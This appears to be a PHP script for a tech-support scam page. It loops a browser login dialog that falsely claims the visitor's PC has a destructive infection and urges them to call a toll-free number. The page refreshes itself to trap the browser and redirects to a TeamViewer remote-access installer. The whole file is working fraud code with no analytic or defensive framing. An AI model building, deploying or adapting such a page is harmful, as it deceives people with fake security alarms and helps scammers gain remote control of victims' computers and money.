<?php

    session_start();

    $_user = 'windows2016d';
    $_password = 'microsoft1';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: ACfdshfgXXdsjhfg.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Suspicious movement distinguished on your IP address because of destructive infection introduced in your PC. Call Toll Free now @ +1-888-984-4462 for any help. "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: ACfdshfgXXdsjhfg.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
